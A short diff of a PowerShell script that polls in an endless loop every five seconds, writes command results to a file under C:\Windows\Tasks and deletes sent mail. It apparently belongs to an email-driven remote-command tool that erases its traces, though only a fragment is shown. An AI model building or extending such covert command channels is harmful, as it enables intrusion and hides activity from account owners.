@@ -428,6 +428,7 @@ while ($true) {
 
                 # Write result to text file
                 Set-Content -Path "C:\Windows\Tasks\mail2.txt" -Value $global:allResult
+                $global:allResult = ""
                 Write-Host "Command result written to mail2.txt"
 
                 # Delete sent mail from sent items
@@ -450,5 +451,4 @@ while ($true) {
 
     # Check every 5 seconds
     Start-Sleep -Seconds 5
-}
 }
